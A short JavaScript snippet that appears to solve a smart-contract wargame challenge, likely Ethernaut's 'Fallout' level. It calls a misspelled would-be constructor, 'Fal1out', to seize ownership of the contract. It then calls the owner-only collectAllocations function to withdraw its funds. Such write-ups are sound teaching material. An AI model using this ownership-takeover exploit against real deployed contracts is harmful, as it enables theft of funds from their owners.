// 'Fal1out' is not a contructor beacause the spelling mistake.
await contract.Fal1out({ value: 1 });

// Run the function which was modified by onlyOwner
await contract.collectAllocations();
